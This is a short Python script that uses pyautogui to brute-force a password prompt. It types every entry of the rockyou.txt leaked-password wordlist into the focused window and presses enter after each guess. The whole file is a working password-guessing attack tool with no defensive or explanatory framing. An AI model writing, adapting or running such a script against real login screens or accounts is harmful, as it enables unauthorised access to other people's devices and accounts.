import pyautogui as pg
import time as t


def bruteforce(wordlist):
	#pg type spam pass
	t.sleep(2)
	if wordlist.lower() == "rockyou.txt" or wordlist.lower() == "ry":
			wordlist = 'wordlists/rockyou.txt' #if wordlist = rockyou, set wordlist path

	with open(wordlist, 'r', encoding='latin-1') as file: # these 2 lines convert the
		passwords = file.read().splitlines() #			 # wordlist file into a .py list
	for password in passwords:
            pg.typewrite(password)
            pg.press('enter')
            pg.press('enter')
            
bruteforce("ry")